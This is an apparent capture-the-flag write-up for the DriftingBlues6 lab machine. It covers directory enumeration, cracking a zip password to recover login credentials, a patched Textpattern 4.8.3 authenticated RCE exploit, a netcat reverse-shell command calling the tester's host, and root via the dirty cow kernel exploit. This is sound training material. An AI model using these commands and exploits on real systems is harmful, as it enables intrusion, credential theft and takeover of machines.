DriftingBlues6

Target IP: 192.168.194.219

Scanning



There is only one TCP port open on the target machine: HTTP on port 80.

Enumeration

Port 80: HTTP

The webpage above is displayed for this application. The source-code of this page contains a message, but it is not very helpful. Time to perform directory search.


Performing a directory search using the command gobuster dir -u http://192.168.194.219/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt, I obtained the result above.


The /robots.txt contains the message above. Looks like there is a hidden directory called /textpattern/textpattern/. The note above also informs us to add a .zip extension during directory search.


The page /textpattern displays the webpage above. I will add driftingblues to /etc/hosts first. Performing a directory search against this directory is the next step.


The /textpattern/textpattern/ displays the login webpage above.


Performing a further directory search using the command gobuster dir -u http://192.168.194.219/textpattern/textpattern/ -w /usr/share/wordlists/dirb/big.txt -x php,html,.zip gives us the result above.


The /textpattern is an interesting page as it shows the version of the application. It is 4.8.3 version.


According to Exploit Database, this version of application is vulnerable to RCE with authentication. Maybe we can spray default credentials against the login webpage.


The robots.txt mentions there is a zip file. After trying a few different wordlists, I had no luck. That is until I tried using directory-list-2.3-small.txt and got a hit on a zip file called spammer.zip.


I downloaded the zip file on my local machine. When trying to extract the files inside the zip file, I was prompted to enter the password. Using zip2john, I obtained the hash of this zip file and cracked the password with rockyou.txt password file. I obtained the password myspace4.


After using the password myspace4, I managed to extract the file inside the zip file. It containst the credential mayer:lionheart. Since there is no SSH port open on this host, maybe we can spray this credential against the login page at /textpattern/textpattern/.


And the credential worked! I now have access to the web application. Time to download the public verified exploit and launch it against the target machine.


Seems like the public exploit has an issue and we have to fix it.

Exploitation


After fixing the public exploit by changing line 89 to index at position 3 for the list, I gained a simple webshell.


Using the simple webshell, I tried to gain a reverse shell connection to my target machine. I tried multiple reverse shell scripts, but only nc -c /bin/bash 192.168.45.174 8443 worked!


And now I have a reverse shell connection from the target host.

Privilege Escalation


Running uname -a shows the kernel version is vulnerable to the exploit dirty cow. After transferring this exploit to the target machine, I executed it using the command gcc -pthread c0w.c -o cow -lcrypt.


And the new user has been created! I created the password rooted. Now all I have to do is switch user to firefart using the password rooted to gain a root shell!


And now I have root privileges using this new account.

Flags


The proof.txt flag once I used the dirty cow exploit to gain root privileges.
